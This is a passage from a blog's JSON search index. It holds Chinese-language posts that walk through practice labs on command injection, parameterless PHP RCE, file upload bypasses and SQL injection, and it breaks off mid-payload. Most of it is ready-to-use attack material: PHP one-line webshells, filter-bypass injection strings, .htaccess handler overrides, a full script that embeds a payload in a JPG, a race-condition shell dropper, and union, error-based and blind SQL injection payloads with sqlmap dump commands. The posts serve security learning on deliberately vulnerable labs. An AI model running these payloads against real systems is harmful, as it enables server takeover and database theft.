[{"content":"hello world 666\n111\n","date":"2025-07-07T18:48:57+08:00","permalink":"https://0d000721999.github.io/p/test/","title":"Test"},{"content":"RCE 远程代码执行：Remote Code Execute\n远程命令执行：Remote Command Execute\nphp RCE函数 命令拼接符号 windows linux pikachu靶场练习 ping 直接在ip后\u0026amp;加命令\neval 用system(\u0026lsquo;ipconfig\u0026rsquo;)或者phpinfo()测试\nDVWA的RCE low 跟pikachu一样直接加\u0026amp;\nmedium 因为平台是Windows，而靶场过滤的是Linux连接符，所以跟上面一样\nhigh 查看源码管道符|后有空格\n我们不加空格直接拼接\nctfhub练习 eval执行 蚁剑连接，右键打开终端\n然后ls /根目录下就有flag\n命令注入-无过滤 要求输入ip,没有过滤\n直接输入127.0.0.1;ls查看目录下文件\n有一个php文件，cat查看没东西\n直接转base64编码\n1 127.0.0.1;cat xxx.php|base64 然后解码得到flag\n命令注入-过滤cat 改为less就行了\n其他命令\n1 2 3 4 5 6 7 8 cat 由第一行开始显示内容，并将所有内容输出 tac 从最后一行倒序显示内容，并将所有内容输出 more 根据窗口大小，一页一页的现实文件内容 less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head 只显示头几行 tail 只显示最后几行 nl 类似于cat -n，显示时输出行号 tailf 类似于tail -f 命令注入-过滤空格 1 使用$IFS$9、%09、\u0026lt;、\u0026gt;、\u0026lt;\u0026gt;、{,}、%20、${IFS}、${IFS}来代替空格 命令注入-过滤命令分隔符 cd跳目录再cat，或者%0a代替目录分隔符/(在url里面输入)\n过滤运算符 其实前面要base64是因为源码被注释了\n所以我们正常cat flag然后查看源码\n综合过滤 flag过滤用f***绕过\ncat改为more\n;用%0a\n然后跟上面一样构造payload到url里面\n1 127.0.0.1%0acd${IFS}f***_is_here${IFS}%0amore${IFS}f***_61177426640.php 防御 1、尽量不要使用命令执行的函数\n2、如果必须使用，需要做白名单处理\n3、用正则表达式对用户输入的内容进行处理\n4、使用WAF\n","date":"2024-10-10T00:00:00Z","image":"https://0d000721999.github.io/p/rce/1.jpg","permalink":"https://0d000721999.github.io/p/rce/","title":"RCE"},{"content":"无参rce 1、getallheaders() getallheaders()返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好implode()这个函数就能胜任。\nimplode()能够直接将getallheaders()返回的数组转化为字符串。\n可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。\n1 ?exp=eval(implode(getallheaders())); 2、get_defined_vars() 该函数的作用是获取所有的已定义变量，返回值也是数组。不过这个函数返回的是一个二维数组，所以不能与implode结合起来用。要用var_dump()输出\n用GET传入的参数会被显示在数组中的第一位\n要返回数组的第一个值要用current()函数可以返回数组中的单元且初始指针指向数组的第一个单元。因为GET方式传入的参数存在该二维数组中的第一个一维数组，所以我们可以通过这个函数将其取出来\n1 var_dump(current(get_defined_vars())); 如果我们传值是这样：\n1 ?get=a\u0026amp;shell=phpinfo(); 后面传入的shell=phpinfo();出现在了第一个数组的最后。\nend()函数可以倒序，也就是说我们可以将命令写到后面的参数再调用函数，执行shell命令\n1 ?exp=eval(end(current(get_defined_vars())));\u0026amp;shell=phpinfo(); 3、session_id() session_id()可以用来获取/设置当前会话 ID。 那么可以用这个函数来获取cookie中的phpsessionid了，并且这个值我们是可控的\n文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号)\n解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。\n1 2 ?exp=eval(hex2bin(session_id(session_start()))); 或者?exp=eval(session_start();system(hex2bin(session_id()))); 执行的命令bp写入16进制解析\n1 hex(\u0026#34;phpinfo();\u0026#34;)=706870696e666f28293b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 getchwd() 函数返回当前工作目录。 scandir() 函数返回指定目录中的文件和目录的数组。 dirname() 函数返回路径中的目录部分。 chdir() 函数改变当前的目录。 readfile() 输出一个文件。 current() 返回数组中的当前单元, 默认取第一个值。 pos() current() 的别名。 next() 函数将内部指针指向数组中的下一个元素，并输出。 end() 将内部指针指向数组中的最后一个元素，并输出。 array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。 array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。 array_slice() 函数在数组中根据条件取出一段值，并返回。 array_reverse() 函数返回翻转顺序的数组。 chr() 函数从指定的 ASCII 值返回字符。 hex2bin() — 转换十六进制字符串为二进制字符串。 getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。 localeconv() 函数返回一包含本地数字及货币格式信息的数组。 ","date":"2024-10-10T00:00:00Z","image":"https://0d000721999.github.io/p/%E6%97%A0%E5%8F%82rce/1.png","permalink":"https://0d000721999.github.io/p/%E6%97%A0%E5%8F%82rce/","title":"无参RCE"},{"content":"文件上传 一句话木马\n1 \u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; webshell https://github.com/tennc/webshell\n网站控制工具 中国菜刀 中国蚁剑 https://github.com/AntSwordProject/antSword\nweevely https://github.com/epinna/weevely3\n哥斯拉godzila https://github.com/BeichenDream/Godzilla\n冰蝎 behinder https://github.com/rebeyond/Behinder\nweevely(kali) 生成木马\n1 weevely generate cmd weevely.php 连接\n1 weevely ip cmd 就可以执行命令了\nupload-labs靶场练习 pass01 提示不让上传php,猜测是前端验证\n禁用js或者\n按下上传要检测，我们直接删掉onsubmit\n上传直接蚁剑连接\npass02 提示对数据包的MIME检查\nMIME Multipurpose Internet Mail Extensions\n多用途互联网邮件扩展类型\n客户端使用：\n1、GET请求不需要这个字段。\n2、POST请求头，放在Content Type字段用来指定上传的文件类型，方便服务器解析。放在Accept，告诉服务端允许接收的响应类型。比如只能接收json或者其他。\n服务端使用：\n放在响应头里面，Content Type告诉客户端响应的数据类型，方便客户端解析。\n官方解释：https://developermozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types\n所以用bp抓包，在我们上传的一句话木马的content-type中修改成image/jpeg，再放行\n蚁剑连接\npass03 黑名单里面有php\n等价拓展名 首先要修改apache的配置\n加上一行将后面这些拓展识别成php,不知道为什么不行\n换一种方式，把后缀名改为.htaccess，也不行\npass04 .htaccess .htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置 。通过 .htaccess 文件，可以实现：网页 301 重定向、自定义404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能\n先上传图片（shell.php改后缀为jpg)然后上传.htaccess\n1 2 3 \u0026lt;FilesMatch \u0026#34;shell.jpg\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 或者\n1 AddType application/x-httpd-php .jpg 1 SetHandler application/x-httpd-php 把图片匹配为php代码\npass05 查看提示存在readme.php\nphp.ini是php的一个全局配置文件，对整个web服务起作用\n而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的php.ini\n1 2 3 4 5 .user.ini 配置项中有两个配置可以起到一些作用 方法一： auto_prepend_file = \u0026lt;filename\u0026gt; //包含在文件头 方法二： auto_append_file = \u0026lt;filename\u0026gt; //包含在文件尾 上传要改php.ini\n下面那个原来是300秒我们改为10秒\n重启服务后\n上传两个文件\n蚁剑连接的文件要改为readme.php\n也可以用 php. . 点空格点 绕过上传\npass06 大小写过滤不全，用PHP就能上传\npass07 没有过滤空格，抓包后在bp里面把文件后缀加空格放行\n然后就连接上了\npass08 抓包改为.php.\npass09 后缀名未做去::$DATA处理\n1 Windows系统下，如果上传的文件名为`9.php::$DATA`会在服务器上生成一个9.php的文件，其内容和所上传文件内容相同并被解析。 连接时要把::$DATA去掉\npass10 因为会去掉末尾的点和头尾空格\n.php. .（点空格点）\npass11 后缀重写绕过\n.pphphp\npass12 需要php的版本号低于5.3.29，且magic_quotes_gpc为关闭状态（需要自己关闭）\nContent-Disposition 作为对下载文件的一个标识字段\n官方解释：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition\n文件名截断 截断字符：chr(0) ，类似于C++的\u0026quot;\\0\u0026quot;\n在url编码里面所以要输入%00\n下面那里改成符合条件的后缀名，上面上传路径填写我们的木马然后用%00截断\npass13 现在路径不是url编码，要用16进制，先写个+占位，+的16进制是2b\nhex改为00\npass14 要上传图片马，并且利用文件包含漏洞来实现运行图片中的木马\n1 2 3 4 5 6 7 8 9 10 补充： Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG Jpg图片文件包括2字节：FF D8。 Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。 Bmp图片文件包括2字节：42 4D。即为 BM 图片马制作： 在cmd里执行 copy logo.jpg/b+test.php/a test.jpg logo.jpg为任意图片；test.php 插入的木马文件；test.jpg 生成的图片木马 linux里面用 cat logo.jpg shell.php\u0026gt;shell.jpg 上传完成后,在include.php后加上传的文件路径\n1 http://upload-labs/include.php?file=upload/xxx.jpg pass15 这里getimagesize()检查是否为图片文件\n1 2 getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。 主要是针对*.php直接更改文件后缀为图片后缀，上一题创建的图片马仍然可以使用。 pass16 1 2 exif_imagetype()读取一个图像的第一个字节并检查其后缀名。 返回值与getimage()函数返回的索引2相同，但是速度比getimage快 跟14一样\npass17 题目用二次渲染把我们图片马里面的马给清除了\ngif的解决办法\n上传图片然后下载回显图片\n用010editor对比，找到相同的地方（上传前和上传后，两张图片Hex仍然保持不变的位置）并插入木马\n我们直接用现成的图片马，利用文件包含，连接成功\n其他图片格式的办法参考upload-labs之pass 16详细分析 - 先知社区\npng脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u0026lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,\u0026#39;./1.png\u0026#39;); ?\u0026gt; 生成的木马是\n1 \u0026lt;?$_GET[0]($_POST[1]);?\u0026gt; jpg脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 \u0026lt;?php $miniPayload = \u0026#34;\u0026lt;?=phpinfo();?\u0026gt;\u0026#34;; if(!extension_loaded(\u0026#39;gd\u0026#39;) || !function_exists(\u0026#39;imagecreatefromjpeg\u0026#39;)) { die(\u0026#39;php-gd is not installed\u0026#39;); } if(!isset($argv[1])) { die(\u0026#39;php jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt;\u0026#39;); } set_error_handler(\u0026#34;custom_error_handler\u0026#34;); for($pad = 0; $pad \u0026lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-\u0026gt;readShort() != 0xFFD8) { die(\u0026#39;Incorrect SOI marker\u0026#39;); } while((!$dis-\u0026gt;eof()) \u0026amp;\u0026amp; ($dis-\u0026gt;readByte() == 0xFF)) { $marker = $dis-\u0026gt;readByte(); $size = $dis-\u0026gt;readShort() - 2; $dis-\u0026gt;skip($size); if($marker === 0xDA) { $startPos = $dis-\u0026gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(\u0026#39;_\u0026#39;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-\u0026gt;eof())) { if($dis-\u0026gt;readByte() === 0xFF) { if($dis-\u0026gt;readByte !== 0x00) { break; } } } $stopPos = $dis-\u0026gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(\u0026#39;payload_\u0026#39;.$argv[1], $outStream)) { die(\u0026#39;Success!\u0026#39;); } else { break; } } } } unlink(\u0026#39;payload_\u0026#39;.$argv[1]); die(\u0026#39;Something\\\u0026#39;s wrong\u0026#39;); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(\u0026#39;/(\\d+) extraneous bytes before marker/\u0026#39;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-\u0026gt;binData = \u0026#39;\u0026#39;; $this-\u0026gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(\u0026#39;File not exists [\u0026#39;.$filename.\u0026#39;]\u0026#39;); $this-\u0026gt;binData = file_get_contents($filename); } else { $this-\u0026gt;binData = $filename; } $this-\u0026gt;size = strlen($this-\u0026gt;binData); } public function seek() { return ($this-\u0026gt;size - strlen($this-\u0026gt;binData)); } public function skip($skip) { $this-\u0026gt;binData = substr($this-\u0026gt;binData, $skip); } public function readByte() { if($this-\u0026gt;eof()) { die(\u0026#39;End Of File\u0026#39;); } $byte = substr($this-\u0026gt;binData, 0, 1); $this-\u0026gt;binData = substr($this-\u0026gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-\u0026gt;binData) \u0026lt; 2) { die(\u0026#39;End Of File\u0026#39;); } $short = substr($this-\u0026gt;binData, 0, 2); $this-\u0026gt;binData = substr($this-\u0026gt;binData, 2); if($this-\u0026gt;order) { $short = (ord($short[1]) \u0026lt;\u0026lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) \u0026lt;\u0026lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-\u0026gt;binData||(strlen($this-\u0026gt;binData) === 0); } } ?\u0026gt; 运行脚本命令\n1 jpg_payload.php 1.jpg pass18 代码审计，传入文件与删除有时间差\n思路：\n条件竞争代码\n1 2 3 4 5 6 //18.php \u0026lt;?php fputs(fopen(\u0026#39;shell.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]) ?\u0026gt;\u0026#39;); ?\u0026gt; #访问18.php，会在目录下生成一个shell.php 用bp来重复上传\n发到intruder模块，payload设置为空，用于无限访问\n线程设置大点\n开始爆破，同时要手动访问文件\npython访问\n1 2 3 4 5 6 7 import requests url = \u0026#34;http://xxx.xxx.xxx.xxx/upload-labs/upload/18.php\u0026#34; while True: html = requests.get(url) if html.status_code == 200: print(\u0026#34;OK\u0026#34;) break pass19 原题有点问题\n改myupload的源码\n拼接/\n利用apach解析漏洞\n1 xxx.php.* -\u0026gt;xxx.php 然后我们bp不断上传白名单内的后缀\n例如shell.php.7z\n另一种思路，将上一关重复生成代码的木马做成图片马\n反复上传图片马\n这里访问的python脚本为：\n1 2 3 4 5 6 7 import requests url = \u0026#34;http://xxx.xxx.xxx.xx/upload-labs/include.php?file=upload/pass19.png\u0026#34; while True: html = requests.get(url) if ( \u0026#39;Warning\u0026#39; not in str(html.text)): print(\u0026#39;ok\u0026#39;) break 直到生成shell.php为止\npass20 利用函数漏洞\n1 move_uploaded_file()会忽略掉文件末尾的 /.，主要作用是将临时文件移到指定的目标路径，并确保文件在移动中不会被删除或覆盖。 所以我们上传shell.php/.上传后会变成shell.php\npass21 修改content-type 修改POST参数为数组类型，就是save_name[]; 索引[0]为shell.php， 索引[2]为jpg|png|gif。 只要第二个索引不为1，就是不能为save_name[1]; $file[count($file) - 1]就等价于$file[2-1]，值为空绕过\n漏扫工具 https://github.com/almandin/fuxploider\n防御 linux文件权限 ","date":"2024-10-09T00:00:00Z","image":"https://0d000721999.github.io/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png","permalink":"https://0d000721999.github.io/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"文件上传漏洞"},{"content":"sqli-labs靶场练习 less1 尝试单引号闭合，是字符型注入。\n判断字段数 找回显点\n收集信息\n爆破数据库 1 2 3 4 5 6 7 爆破数据库 ?id=-1\u0026#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+ group_concat()函数可以让多个数据在一行显示，但是只能显示64位，可以选择截取或者用limit的方式 显示全部数据 ?id=-1\u0026#39; union select 1,2,(schema_name) from information_schma.schemata limit 0,1--+ 爆破表名 1 2 3 爆破表名 ?id=-1\u0026#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ 爆破字段名 1 2 3 爆破字段名 ?id=-1\u0026#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ 爆破字段 1 2 3 爆破字段 ?id=-1\u0026#39; union select 1,2,(select group_concat(username,0x7e,password)from users)--+ less1 sqlmap的运用 1 python sqlmap.py -u ip --batch//跳过询问 python环境打开\n1 2 猜解当前数据库名称 sqlmap.py -u ip --batch --current-db 1 2 猜解表名 sqlmap.py -u ip --batch -D \u0026#34;security\u0026#34; --tables 1 2 猜解字段 sqlmap.py -u ip -D \u0026#34;security\u0026#34; -T \u0026#34;users\u0026#34; --columns 1 2 脱库 sqmap.py -u ip -D \u0026#34;security\u0026#34; -T \u0026#34;users\u0026#34; --dump less2 数字型注入\n判断字段数\n1 ?id=1 or 1=2 order by 4--+ 找到回显点，信息收集\n1 ?id=-1 union select 1,2,3--+ 开始注入\n1 2 3 4 5 6 7 8 9 10 11 12 爆破数据库 ?id=-1 union select 1,2,group_concat(schema_name)from information_schema.schemata--+ 爆破表单名 ?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ 爆破字段 ?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ 爆破字段内容 ?id=-1 union select 1,2,(select group_concat(username,0x7e,password)from users)- -+ less3 闭合方式是')\n判断字段数\n1 ?id=1\u0026#39;) and 1=1\torder by 4--+ 找回显点，信息收集，然后注入\n1 2 3 4 5 6 7 8 9 10 11 12 爆破数据库 ?id=1\u0026#39;) and 1=2 union select 1,version(),group_concat(schema_name)from information_schema.schemata--+ 爆破表单 ?id=1\u0026#39;) and 1=2 union select 1,version(),group_concat(table_name)from information_schema.tables where table_schema=database()--+ 爆破字段 ?id=1\u0026#39;) and 1=2 union select 1,version(),group_concat(colum_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ 爆破数据 ?id=1\u0026#39;) and 1=2 union select 1,version(),(select group_concat(username,0x7e,password)from users)--+ less4 闭合方式是\u0026quot;)\n1 2 3 4 5 6 7 8 9 信息收集，字段判断，爆破数据库表 ?id=1\u0026#34;) and 1=2 union select 1,version(),group_concat(table_name)from information_schema.tables where table_schema=database()--+ 爆破字段 ?id=1\u0026#34;) and 1=2 union select 1,version(),group_concat(column_name)from information_schema.columns where table_name=\u0026#34;users\u0026#34;--+ 最后爆破出所有数据 ?id=1\u0026#34;) and 1=2 union select 1,version(),(select group_concat(username,0x7e,password)from users)--+ less5 没有用户和id的回显，查看有无报错回显，找到闭合方式\n闭合为单引号闭合，查字段数\n这边输入为假的条件看看\n查看源码，可以使用报错注入\n报错注入 报错常用的三个函数，extractvalue(),updatexml(),floor(),还有exp(),\n1. 用extractvalue函数进行报错注入。 1 2 3 爆破数据库 ?id=1\u0026#39; or/and extractvalue(1,concat(0x7e,database()/(select database()),0x7e))--+ 1 2 3 爆破数据库表 ?id=1\u0026#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e))--+ 1 2 3 爆破字段 ?id=1\u0026#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;),0x7e))--+ group-concat()函数可能放不下所有内容，可以采用截取或者limit函数读取\n1 2 3 爆破数据内容 ?id=1\u0026#39; or extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e))--+ 2. 用updatexml()函数进行报错注入 1 2 3 4 5 6 7 8 9 10 11 爆破数据库 ?id=1\u0026#39; or/and updatexml(1,concat(0x7e,database()/(select database()),0x7e),1)--+ 爆破数据库表 ?id=1\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)--+ 爆破字段 ?id=1\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;),0x7e),1)--+ 爆破数据内容 ?id=1\u0026#39; or updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+ 3.通过floor()函数进行报错注入，前提需要知道有多少字段数 1 2 3 爆破数据库 ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ 1 2 3 4 爆破数据库表 ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ 1 2 3 4 爆破字段 ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ 1 2 3 爆破数据库内容 ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(select (username)from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ sqlmap梭less5 -dbs枚举数据库 使用-o参数优化,\u0026ndash;batch参数进行跳过，\u0026ndash;threads参数开启更多线程\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 -o --threads=10 -dbs --batch 注意，耗时过久，主要是联合查询耗时，从结果看并没有联合查询注入。\n\u0026ndash;tables枚举数据库表 添加\u0026ndash;technique参数加速，\u0026ndash;dbms指定\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --dbms mysql --technique E -o --threads=10 -D security --tables --batch \u0026ndash;columns枚举列 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --dbms mysql --technique E -o -D security -T users --columns --batch \u0026ndash;dump枚举数据 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --dbms mysql --technique E -o -D security -T users -C username,password --dump --batch less6 把less5的单引号闭合改为双引号\nless7 看回显\nSQl注入的写入与读取\n读取文件 load_file(文件的路径)\n写入文件into outfile(),into_dumpfile()\n猜闭合方式是\u0026rsquo;))\n猜字段数\n通过页面回显布尔方式猜解到字段数为3，能够读写需要的几个条件\n需要高权限(root权限)\n需要有问价写入权限secure_file_priv不是NULL\n需要知道绝对路径\n魔术引号gbc时关闭的 magic_quotes_gpc = Off\n关键步骤：写入木马 1 2 ?id=1\u0026#39;)) and 1=2 union select 1,2,\u0026#34;\u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]) ?\u0026gt;\u0026#34;%20 into outfile \u0026#34;X:\\\\xx\\\\xx\\\\xx\\\\xx\\\\shell.php\u0026#34;--+ 小问题：文件无法写入 原因是MySQL数据库里\nsecure_file_priv 这个参数设置为了null或者没有设这个参数。\n写入后蚁剑提权。\n要将url后加shell.php才能连上\nless8 找到闭合方式为单引号，但是没有回显，因此报错注入的方法已经不能够实现注入\n对和错返回不同的页面回显，可以采用布尔盲注的方式\n布尔盲注 判断字段数\n字段数为3\n1 2 3 猜解数据库名字的长度 ?id=-1\u0026#39; or length(database())=8--+ 小tips：一那么采用逻辑或，因为无法确保前面的条件一定为真 1 2 3 4 5 6 逐一猜解数据库 ?id=-1\u0026#39; or ascii(substr(database(),1,1))=115--+ 或者 ?id=-1\u0026#39; or ascii(mid(database(),1,1))=115--+ 或者 ?id=-1\u0026#39; or mid(database(),1,1)=\u0026#39;s\u0026#39;--+ 按照相同的方法猜解数据表的名字和字段内容\n1 2 ?id=-1\u0026#39; or ascii(mid(select (table_name) from information_schema.tables where table_schema=database() limit 1,1))=?--+ 对于布尔盲注的问题，一般采用脚本进行猜解或者使用sqlmap\nsqlmap梭less8 -dbs枚举数据库 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 -o -dbs --batch \u0026ndash;tables枚举数据库表 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbms mysql --technique B -o -D security --tables --batch \u0026ndash;columns枚举列 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbms mysql --technique B -o -D security -T users --columns --batch \u0026ndash;dump枚举数据 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbms mysql --technique B -o -D security -T users -C username,password --dump --batch 关于sqlmap \u0026ndash;technique 参数 1 2 3 4 5 6 7 8 9 10 11 B：Boolean-based blind（布尔型注入） E：Error-based（报错型注入） U：Union query-based（可联合查询注入） S：Stacked queries（可多语句查询注入） T：Time-based blind（基于时间延迟注入） Q：Inline queries（嵌套查询注入） less9 怎么闭合都不对\n试试时间盲注\n1 2 例如 ?id=-1\u0026#39; or if(length(database())=8,sleep(5),0)--+ 发现界面有延迟\n1 2 3 猜解数据库名称 ?id=-1\u0026#39; or if(ascii(mid(database(),1,1))\u0026lt;=135,sleep(5),0)--+ 相同的方式猜解数据表数据字段 sqlmap梭less9 把参数改为T\nless10 与Less9的区别在于闭合方式为 双引号，同样是时间盲注\nless11 进入POST注入\n看见登入框，为方便注入，bp启动\n单引号闭合且字段数为2\n联合注入\nsqlmap的POST运用 1、指定探测注入点 1 2 3 4 5 6 7 8 9 10 方式一 启动sqlmap探测注入点 python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch 爆破当前数据库名 python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch --current-db 爆破数据表 python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch -D security --tables 最后脱库 python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch -D security -T users - -dump 2、将抓包内容保存到.txt文件中 1 2 启动sqlmap python sqlmap.py -r txt文件位置 -p 要扫描的点 1 2 3 4 5 6 爆破数据库 python sqlmap.py -r .txt文件位置 -p 扫描的位置 --current-db 爆破表 python sqlmap.py -r .txt文件位置 -p 扫描的位置 -D security --tables 脱库 pyhton sqlmap.py -r .txt文件位置 -p 扫描的位置 -D security --dump less12 闭合方式为\u0026quot;),还是bp启动\n联合注入和报错注入都行\n采用extractvalue()函数报错注入 1 2 查询数据库表 uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select database()),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 1 2 爆破数据表 uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 1 2 爆破字段名 uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;uagents\u0026#39; limit 3,1),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 1 2 3 爆破字段 uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 用updatexml()函数进行报错注入 1 2 3 4 5 6 7 8 9 10 11 查询数据库表 uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select database()),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破数据表 uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破字段名 uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select (column_name)from information_schema.columns where 